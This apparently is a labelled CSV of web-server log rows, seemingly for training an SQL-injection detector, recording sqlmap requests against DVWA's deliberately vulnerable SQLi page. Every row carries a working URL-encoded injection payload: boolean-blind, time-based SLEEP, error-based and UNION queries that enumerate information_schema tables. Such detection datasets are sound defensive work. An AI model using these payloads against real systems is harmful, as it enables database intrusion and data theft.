ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_BEING_DELETED%29%2C1%2C1%29%29%3E56%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_BEING_DELETED%29%2C1%2C1%29%29%3E56%23&Submit=Submit,HTTP/1.1,233,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_BEING_DELETED%29%2C1%2C1%29%29%3E57%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_BEING_DELETED%29%2C1%2C1%29%29%3E57%23&Submit=Submit,HTTP/1.1,233,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%201779%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_BEING_DELETED%29%2C1%2C1%29%29%3E51%2C0%2C5%29%29%29%29%29JZAs%29--%20gLMv&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%201779%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_BEING_DELETED%29%2C1%2C1%29%29%3E51%2C0%2C5%29%29%29%29%29JZAs%29--%20gLMv&Submit=Submit,HTTP/1.1,320,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%201779%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_BEING_DELETED%29%2C1%2C1%29%29%3E48%2C0%2C5%29%29%29%29%29JZAs%29--%20gLMv&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%201779%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_BEING_DELETED%29%2C1%2C1%29%29%3E48%2C0%2C5%29%29%29%29%29JZAs%29--%20gLMv&Submit=Submit,HTTP/1.1,320,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%201779%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_BEING_DELETED%29%2C1%2C1%29%29%3E9%2C0%2C5%29%29%29%29%29JZAs%29--%20gLMv&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%201779%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_FT_BEING_DELETED%29%2C1%2C1%29%29%3E9%2C0%2C5%29%29%29%29%29JZAs%29--%20gLMv&Submit=Submit,HTTP/1.1,319,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x494e4e4f44425f545258%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit HTTP/1.1,200,2182,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x494e4e4f44425f545258%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit,HTTP/1.1,361,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ctrx_autocommit_non_locking%2Ctrx_concurrency_tickets%2Ctrx_foreign_key_checks%2Ctrx_id%2Ctrx_is_read_only%2Ctrx_isolation_level%2Ctrx_last_foreign_key_error%2Ctrx_lock_memory_bytes%2Ctrx_lock_structs%2Ctrx_mysql_thread_id%2Ctrx_operation_state%2Ctrx_query%2Ctrx_requested_lock_id%2Ctrx_rows_locked%2Ctrx_rows_modified%2Ctrx_started%2Ctrx_state%2Ctrx_tables_in_use%2Ctrx_tables_locked%2Ctrx_unique_checks%2Ctrx_wait_started%2Ctrx_weight%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_TRX%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ctrx_autocommit_non_locking%2Ctrx_concurrency_tickets%2Ctrx_foreign_key_checks%2Ctrx_id%2Ctrx_is_read_only%2Ctrx_isolation_level%2Ctrx_last_foreign_key_error%2Ctrx_lock_memory_bytes%2Ctrx_lock_structs%2Ctrx_mysql_thread_id%2Ctrx_operation_state%2Ctrx_query%2Ctrx_requested_lock_id%2Ctrx_rows_locked%2Ctrx_rows_modified%2Ctrx_started%2Ctrx_state%2Ctrx_tables_in_use%2Ctrx_tables_locked%2Ctrx_unique_checks%2Ctrx_wait_started%2Ctrx_weight%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_TRX%23&Submit=Submit,HTTP/1.1,666,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28trx_autocommit_non_locking%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_concurrency_tickets%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_foreign_key_checks%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_id%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_is_read_only%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_isolation_level%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_last_foreign_key_error%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_lock_memory_bytes%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_lock_structs%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_mysql_thread_id%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_operation_state%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_query%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_requested_lock_id%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_rows_locked%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_rows_modified%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_started%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_state%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_tables_in_use%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_tables_locked%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_unique_checks%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_wait_started%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_weight%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_TRX%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28trx_autocommit_non_locking%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_concurrency_tickets%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_foreign_key_checks%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_id%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_is_read_only%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_isolation_level%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_last_foreign_key_error%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_lock_memory_bytes%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_lock_structs%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_mysql_thread_id%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_operation_state%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_query%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_requested_lock_id%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_rows_locked%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_rows_modified%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_started%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_state%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_tables_in_use%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_tables_locked%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_unique_checks%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_wait_started%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28trx_weight%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_TRX%23&Submit=Submit,HTTP/1.1,1874,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ctrx_autocommit_non_locking%2Ctrx_concurrency_tickets%2Ctrx_foreign_key_checks%2Ctrx_id%2Ctrx_is_read_only%2Ctrx_isolation_level%2Ctrx_last_foreign_key_error%2Ctrx_lock_memory_bytes%2Ctrx_lock_structs%2Ctrx_mysql_thread_id%2Ctrx_operation_state%2Ctrx_query%2Ctrx_requested_lock_id%2Ctrx_rows_locked%2Ctrx_rows_modified%2Ctrx_started%2Ctrx_state%2Ctrx_tables_in_use%2Ctrx_tables_locked%2Ctrx_unique_checks%2Ctrx_wait_started%2Ctrx_weight%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_TRX%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ctrx_autocommit_non_locking%2Ctrx_concurrency_tickets%2Ctrx_foreign_key_checks%2Ctrx_id%2Ctrx_is_read_only%2Ctrx_isolation_level%2Ctrx_last_foreign_key_error%2Ctrx_lock_memory_bytes%2Ctrx_lock_structs%2Ctrx_mysql_thread_id%2Ctrx_operation_state%2Ctrx_query%2Ctrx_requested_lock_id%2Ctrx_rows_locked%2Ctrx_rows_modified%2Ctrx_started%2Ctrx_state%2Ctrx_tables_in_use%2Ctrx_tables_locked%2Ctrx_unique_checks%2Ctrx_wait_started%2Ctrx_weight%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_TRX%23&Submit=Submit,HTTP/1.1,666,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_TRX%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_TRX%23&Submit=Submit,HTTP/1.1,235,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20%28SELECT%202800%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71766b7871%2C%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_TRX%29%2C0x716a707171%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20sZXp&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20%28SELECT%202800%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71766b7871%2C%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_TRX%29%2C0x716a707171%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20sZXp&Submit=Submit,HTTP/1.1,373,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_TRX%29%2C1%2C1%29%29%3E51%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_TRX%29%2C1%2C1%29%29%3E51%23&Submit=Submit,HTTP/1.1,220,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_TRX%29%2C1%2C1%29%29%3E54%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_TRX%29%2C1%2C1%29%29%3E54%23&Submit=Submit,HTTP/1.1,220,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_TRX%29%2C1%2C1%29%29%3E56%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_TRX%29%2C1%2C1%29%29%3E56%23&Submit=Submit,HTTP/1.1,220,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_TRX%29%2C1%2C1%29%29%3E57%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_TRX%29%2C1%2C1%29%29%3E57%23&Submit=Submit,HTTP/1.1,220,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%208663%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_TRX%29%2C1%2C1%29%29%3E51%2C0%2C5%29%29%29%29%29whdG%29--%20tRCD&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%208663%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_TRX%29%2C1%2C1%29%29%3E51%2C0%2C5%29%29%29%29%29whdG%29--%20tRCD&Submit=Submit,HTTP/1.1,307,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%208663%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_TRX%29%2C1%2C1%29%29%3E48%2C0%2C5%29%29%29%29%29whdG%29--%20tRCD&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%208663%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_TRX%29%2C1%2C1%29%29%3E48%2C0%2C5%29%29%29%29%29whdG%29--%20tRCD&Submit=Submit,HTTP/1.1,307,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%208663%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_TRX%29%2C1%2C1%29%29%3E9%2C0%2C5%29%29%29%29%29whdG%29--%20tRCD&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%208663%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_TRX%29%2C1%2C1%29%29%3E9%2C0%2C5%29%29%29%29%29whdG%29--%20tRCD&Submit=Submit,HTTP/1.1,306,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x504c5547494e53%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit HTTP/1.1,200,2006,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x504c5547494e53%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit,HTTP/1.1,355,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:52-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CLOAD_OPTION%2CPLUGIN_AUTHOR%2CPLUGIN_AUTH_VERSION%2CPLUGIN_DESCRIPTION%2CPLUGIN_LIBRARY%2CPLUGIN_LIBRARY_VERSION%2CPLUGIN_LICENSE%2CPLUGIN_MATURITY%2CPLUGIN_NAME%2CPLUGIN_STATUS%2CPLUGIN_TYPE%2CPLUGIN_TYPE_VERSION%2CPLUGIN_VERSION%29%29%2C0x716a707171%29%20FROM%20information_schema.%60PLUGINS%60%23&Submit=Submit HTTP/1.1,200,3860,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CLOAD_OPTION%2CPLUGIN_AUTHOR%2CPLUGIN_AUTH_VERSION%2CPLUGIN_DESCRIPTION%2CPLUGIN_LIBRARY%2CPLUGIN_LIBRARY_VERSION%2CPLUGIN_LICENSE%2CPLUGIN_MATURITY%2CPLUGIN_NAME%2CPLUGIN_STATUS%2CPLUGIN_TYPE%2CPLUGIN_TYPE_VERSION%2CPLUGIN_VERSION%29%29%2C0x716a707171%29%20FROM%20information_schema.%60PLUGINS%60%23&Submit=Submit,HTTP/1.1,464,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:53-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x4f5054494d495a45525f5452414345%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit HTTP/1.1,200,1979,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x4f5054494d495a45525f5452414345%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit,HTTP/1.1,371,5,40,SQLi
